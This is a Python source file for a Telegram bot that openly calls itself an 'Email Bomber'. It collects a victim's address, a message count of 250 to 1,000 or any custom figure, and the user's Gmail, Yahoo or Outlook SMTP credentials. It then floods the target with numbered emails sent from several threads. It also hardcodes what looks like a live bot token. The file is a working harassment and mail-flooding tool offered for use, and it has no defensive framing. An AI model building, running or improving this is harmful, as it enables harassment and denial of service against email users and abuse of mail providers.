import smtplib
import time
import os
import sys
from email.utils import formataddr
import threading
import telebot
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

bot = telebot.TeleBot("6138199032:AAED2by4VqEeLHWoEnoXsyWQuM7-W1YAD1M")

user_context = {}


class EmailBomber:
    def __init__(self, target, mode, amount, server, port, from_addr, from_pwd, subject, sender_name, message):
        self.target = target
        self.mode = mode
        self.amount = amount
        self.server = server
        self.port = port
        self.from_addr = from_addr
        self.from_pwd = from_pwd
        self.subject = subject
        self.sender_name = sender_name
        self.message = message

    def send_email(self, index):
        try:
            with smtplib.SMTP(self.server, self.port) as s:
                s.starttls()
                s.login(self.from_addr, self.from_pwd)

                subject = f'{self.subject} ({index + 1})'
                msg = f'''From: {formataddr((self.sender_name, self.from_addr))}\nTo: {self.target}\nSubject: {subject}\n\n{self.message}\n'''
                s.sendmail(self.from_addr, self.target, msg.encode('utf-8'))
        except smtplib.SMTPException as e:
            print(f'BOMB failed: {e}')

    def attack(self, num_threads, sleep_time, chat_id):
        try:
            print('Initializing program...')

            print('\nSetting up bomb...\n')

            threads = []

            for i in range(self.amount):
                if i % num_threads == 0 and i != 0:
                    for t in threads:
                        t.join()
                    threads.clear()

                t = threading.Thread(target=self.send_email, args=(i,))
                t.start()
                threads.append(t)
                time.sleep(sleep_time)

            for t in threads:
                t.join()

            print('\nAttack finished. DONE')
            send_bombing_complete_message(chat_id)  # Notify bombing complete
        except Exception as e:
            print(f'ERROR: {e}')
            exit(1)


@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id

    user_context[chat_id] = {}

    reply = "Welcome to Email Bomber bot!\n\nThis bot allows you to send a large number of emails to a target email address.\n\nTo start the email bombing attack, use the /bomb command."
    bot.send_message(chat_id, reply)


@bot.message_handler(commands=['bomb'])
def bomb(message):
    chat_id = message.chat.id

    if 'server' not in user_context[chat_id] or 'port' not in user_context[chat_id] \
            or 'from_addr' not in user_context[chat_id] or 'from_pwd' not in user_context[chat_id] \
            or 'subject' not in user_context[chat_id] or 'sender_name' not in user_context[chat_id] \
            or 'message' not in user_context[chat_id]:
        reply = "Please configure the email bombing settings first in the 'settings' menu."
        bot.send_message(chat_id, reply)
    else:
        reply = "Enter the target email address:"
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, set_target)


def set_target(message):
    chat_id = message.chat.id
    target = message.text

    user_context[chat_id]['target'] = target

    reply = "Enter BOMB mode:\n1: 1000\n2: 500\n3: 250\n4: Custom"
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, set_mode)


def set_mode(message):
    chat_id = message.chat.id
    mode = int(message.text)

    user_context[chat_id]['mode'] = mode

    if mode == 4:
        reply = "Enter a custom amount:"
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, set_custom_amount)
    else:
        amount = get_amount_from_mode(mode)
        user_context[chat_id]['amount'] = amount

        reply = f"BOMB mode set to: {mode}\nAmount set to: {amount}\n\nEnter email server:\n1: Gmail\n2: Yahoo\n3: Outlook"
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, set_server)


def set_custom_amount(message):
    chat_id = message.chat.id
    amount = int(message.text)

    user_context[chat_id]['amount'] = amount

    reply = f"Custom amount set to: {amount}\n\nEnter email server:\n1: Gmail\n2: Yahoo\n3: Outlook"
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, set_server)


def set_server(message):
    chat_id = message.chat.id
    server = get_server_from_choice(message.text)

    if server is None:
        reply = "Invalid email server. Please try again:\n1: Gmail\n2: Yahoo\n3: Outlook"
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, set_server)
    else:
        user_context[chat_id]['server'] = server

        reply = "Enter SMTP port number:"
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, set_port)


def set_port(message):
    chat_id = message.chat.id
    port = message.text

    user_context[chat_id]['port'] = port

    reply = "Enter your email address (from address):"
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, set_from_address)


def set_from_address(message):
    chat_id = message.chat.id
    from_addr = message.text

    user_context[chat_id]['from_addr'] = from_addr

    reply = "Enter your email password (from password):"
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, set_from_password)


def set_from_password(message):
    chat_id = message.chat.id
    from_pwd = message.text

    user_context[chat_id]['from_pwd'] = from_pwd

    reply = "Enter the email subject:"
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, set_subject)


def set_subject(message):
    chat_id = message.chat.id
    subject = message.text

    user_context[chat_id]['subject'] = subject

    reply = "Enter your name (sender name):"
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, set_sender_name)


def set_sender_name(message):
    chat_id = message.chat.id
    sender_name = message.text

    user_context[chat_id]['sender_name'] = sender_name

    reply = "Enter the email message:"
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, set_message)


def set_message(message):
    chat_id = message.chat.id
    email_message = message.text

    user_context[chat_id]['message'] = email_message

    reply = "Enter the number of threads (recommended: 5):"
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, set_num_threads)


def set_num_threads(message):
    chat_id = message.chat.id
    num_threads = int(message.text)

    reply = "Enter the sleep time between emails (recommended: 0.5):"
    bot.send_message(chat_id, reply)

    user_context[chat_id]['num_threads'] = num_threads

    bot.register_next_step_handler(message, set_sleep_time)


def set_sleep_time(message):
    chat_id = message.chat.id
    sleep_time = float(message.text)

    # Retrieve user input from user_context
    target = user_context[chat_id]['target']
    mode = user_context[chat_id]['mode']
    amount = user_context[chat_id]['amount']
    server = user_context[chat_id]['server']
    port = user_context[chat_id]['port']
    from_addr = user_context[chat_id]['from_addr']
    from_pwd = user_context[chat_id]['from_pwd']
    subject = user_context[chat_id]['subject']
    sender_name = user_context[chat_id]['sender_name']
    message = user_context[chat_id]['message']
    num_threads = user_context[chat_id]['num_threads']

    # Create an instance of EmailBomber
    bomber = EmailBomber(target, mode, amount, server, port, from_addr, from_pwd, subject, sender_name, message)

    reply = "Starting the email bombing attack..."
    bot.send_message(chat_id, reply)

    threading.Thread(target=bomber.attack, args=(num_threads, sleep_time, chat_id)).start()


def get_amount_from_mode(mode):
    if mode == 1:
        return 1000
    elif mode == 2:
        return 500
    elif mode == 3:
        return 250


def get_server_from_choice(choice):
    if choice == '1':
        return 'smtp.gmail.com'
    elif choice == '2':
        return 'smtp.mail.yahoo.com'
    elif choice == '3':
        return 'smtp-mail.outlook.com'
    else:
        return None


def send_bombing_complete_message(chat_id):
    reply = "Email bombing attack completed!"
    bot.send_message(chat_id, reply)



@bot.message_handler(commands=['settings'])
def settings(message):
    chat_id = message.chat.id

    if chat_id not in user_context:
        user_context[chat_id] = {}

    if 'server' in user_context[chat_id] and 'port' in user_context[chat_id]:
        server = user_context[chat_id]['server']
        port = user_context[chat_id]['port']
        reply = f"Email server: {server}\nSMTP port: {port}\n\nEnter '1' for SMTP setup\nEnter '2' for Edit SMTP"
    else:
        reply = "Email server and SMTP port are not configured.\n\nEnter the email server:\n1: Gmail\n2: Yahoo\n3: Outlook"

    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, handle_settings_choice)


def handle_settings_choice(message):
    chat_id = message.chat.id
    choice = message.text

    if choice == '1':
        # SMTP setup submenu
        bot.send_message(chat_id, "SMTP setup submenu")
        bot.register_next_step_handler(message, smtp_setup_submenu)
    elif choice == '2':
        # Edit SMTP submenu
        bot.send_message(chat_id, "Edit SMTP submenu")
        bot.register_next_step_handler(message, edit_smtp_submenu)
    else:
        reply = "Invalid choice. Please try again."
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, handle_settings_choice)


def smtp_setup_submenu(message):
    chat_id = message.chat.id
    # Implement SMTP setup logic here
    bot.send_message(chat_id, "SMTP setup submenu")


def edit_smtp_submenu(message):
    chat_id = message.chat.id
    # Implement Edit SMTP logic here
    bot.send_message(chat_id, "Edit SMTP submenu")


def set_server_or_port(message):
    chat_id = message.chat.id
    choice = message.text

    if choice == 'edit':
        reply = "Enter the email server:\n1: Gmail\n2: Yahoo\n3: Outlook"
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, edit_server_or_port)
    else:
        reply = "Invalid choice. Please try again."
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, set_server_or_port)


def edit_server_or_port(message):
    chat_id = message.chat.id
    choice = message.text

    if choice in ['1', '2', '3']:
        server = get_server_from_choice(choice)

        user_context[chat_id]['server'] = server

        reply = "Enter the SMTP port number:"
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, edit_port)
    else:
        reply = "Invalid email server. Please try again:\n1: Gmail\n2: Yahoo\n3: Outlook"
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, edit_server_or_port)


def edit_port(message):
    chat_id = message.chat.id
    port = message.text

    user_context[chat_id]['port'] = port

    reply = "Email server and SMTP port updated successfully!"
    bot.send_message(chat_id, reply)


@bot.message_handler(func=lambda message: True)
def default(message):
    chat_id = message.chat.id

    reply = "Invalid command. Please use the /bomb command to start the email bombing attack."
    bot.send_message(chat_id, reply)


bot.polling()
